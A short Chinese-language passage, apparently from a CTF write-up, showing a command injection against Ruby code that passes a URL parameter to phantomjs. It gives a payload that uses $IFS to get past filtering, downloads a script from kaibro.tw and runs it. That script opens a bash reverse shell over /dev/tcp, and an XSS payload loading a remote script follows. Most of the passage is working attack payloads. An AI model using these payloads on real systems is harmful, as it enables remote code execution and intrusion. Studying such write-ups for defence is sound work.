site塞陣列進去會噴Error:

可以看到部分關鍵source code:

`pid = Process.spawn("phantomjs --web-security=no bot.js '" +  URI.escape(site)  + "'")`

構造Command Injection Payload:

`site=';a=kaibro.tw/s.sh;b=/tmp;c=s.sh;cd$IFS$b;wget$IFS$a;sh$IFS$c;'`


s.sh:

`bash -c 'bash -i >& /dev/tcp/kaibro.tw/5566 0>&1'`

---

除了Command Injection，他還可以XSS

`site="><script src="http://kaibro.tw/gg.js"></script>`
